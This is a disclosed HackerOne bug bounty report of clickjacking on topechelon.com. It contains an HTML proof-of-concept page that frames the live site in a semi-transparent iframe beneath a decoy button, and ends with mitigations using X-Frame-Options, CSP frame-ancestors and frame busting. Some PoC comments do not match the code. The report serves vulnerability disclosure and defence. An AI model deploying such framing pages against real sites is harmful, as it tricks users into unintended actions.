# Clickjacking in main domain https://topechelon.com/

## Report Details
- **Report ID**: 2964441
- **URL**: https://hackerone.com/reports/2964441
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-01-29T13:57:33.227Z
- **Disclosed**: 2025-02-10T13:17:10.542Z

## Reporter
- **Username**: genz-1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: top_echelon_software

## Vulnerability Information
## **Summary:**  
The target website is vulnerable to Clickjacking, a web-based attack that tricks users into interacting with a hidden or disguised iframe. Attackers can exploit this vulnerability to manipulate user actions, potentially leading to unauthorized activities such as unintended clicks, form submissions, or credential theft.  

## **Steps to Reproduce:**  
1. **Create an HTML page** embedding the target website using an `<iframe>`.  
2. **Modify CSS** to make the iframe transparent or overlay it with deceptive UI elements.  
3. **Host the HTML page** and trick users into interacting with it.  

## **Proof of Concept (PoC):**  
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
</body>
</html>
```
{F4001108}

## Impact

- **User Account Takeover:** If a logged-in user interacts with the iframe, attackers could force unintended actions.  
- **Phishing Attacks:** Users may unknowingly enter sensitive credentials.  
- **Malicious Actions:** Attackers can exploit user interactions to modify settings, submit forms, or perform other unintended operations.  

## **Recommended Mitigation:**  
To prevent Clickjacking attacks, implement the following security measures:  

1. **Use the X-Frame-Options HTTP Header:**  
   - `X-Frame-Options: DENY` (Prevents embedding in iframes).  
   - `X-Frame-Options: SAMEORIGIN` (Allows iframes only from the same domain).  

2. **Use Content Security Policy (CSP) Frame-Ancestors Directive:**  
   - `Content-Security-Policy: frame-ancestors 'self'`  

3. **JavaScript-Based Frame Busting (as an additional security measure):**  
   ```javascript
   if (window.top !== window.self) {
       window.top.location = window.self.location;
   }

## Attachments
- image.png
